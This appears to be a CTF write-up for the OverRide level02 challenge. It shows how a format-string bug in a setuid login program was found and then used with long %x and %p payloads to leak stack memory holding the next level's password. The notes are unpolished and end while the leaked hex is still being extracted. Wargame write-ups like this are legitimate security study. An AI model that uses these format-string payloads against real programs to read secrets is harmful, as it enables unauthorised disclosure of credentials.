### step 1: Decompile with Ghidra

C code is available in the `source` file  

/!\ File in 64 bits  
```
level02@OverRide:~$ file level02 
level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 26.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
```

### step 2: Code analysis

- Two buffers are filled with `stdin`
  - `buffer1[12]`
  - `buffer2[14]`

- A Username is asked a fill `buffer1`
- If we try to overflow `buffer1` with more than 12 chars, `buffer2` gets filled. Here is an example with only one long input :  

```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
--[ Password: *****************************************
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA does not have access!
```

**But we don't get a segfault this way**  

```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAA%8lx.%8x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
--[ Password: *****************************************
AAAAffffe4f0.00000000.00000025.2a2a2a2a.2a2a2a2a.ffffe6e8.f7ff9a08.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.00000000. does not have access!
```
7838302530252e782e7838303830252e252e7838

reversed :
252e78383830252e

0x400d22 = \x22\x0d\x40\x00
f7ff9a08 = \x08\x9a\xff\xf7
ffffe4f0 = \xf0\xe4\xff\xff
0x7fffffffe5d0
printf ("\x22\x0d\x40\x00_%08x.%08x.%08x.%08x.%08x|%s|")


### Finding the adress of `file_content`

(gdb) b *0x0000000000400818
Breakpoint 1 at 0x400818

(gdb) r
Starting program: /home/users/level02/level02 

Breakpoint 1, 0x0000000000400818 in main ()
(gdb) p $rsp
$1 = (void *) 0x7fffffffe5d0

- Stack Pointer Address at the beginning of the main is : `0x7fffffffe5d0`  

- The allocated size of stack variables are 288 bytes (0x120)

- The variable is the second declared in the main so it will be the second to last in the memory, the last being an int of size 4 bytes
=> 

AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx.%16lx

AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x

```
AAAAffffe4f0.0.2e.2a2a2a2a.2a2a2a2a.ffffe6e8.f7ff9a08.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.78252e.0.34376848.61733951.574e6758.6e475873.664b394d.0.41414141.78252e78.252e7825.2e78252e.78252e78 does not have access!
```

We can extract this group of 5 * 8 = 40 bytes  followed by `\0` that could be our flag string in hex

34376848.61733951.574e6758.6e475873.664b394d

`3437684861733951574e67586e475873664b394d`

hex to string : `47hHas9QWNgXnGXsfK9M` => does not work !

reversed : 664b394d6e475873574e67586173395134376848 => `fK9MnGXsWNgXas9Q47hH`


%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p

```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
--[ Password: *****************************************
0x7fffffffe4f0(nil)0x700x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6e80x1f7ff9a080x25702570257025700x70(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x29002570250x602010(nil)0x7ffff7a3d7ed(nil)0x7fffffffe6e80x1000000000x400814(nil)0xec9d7c0ee9efabd3 does not have access!
```

We extract `0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d`
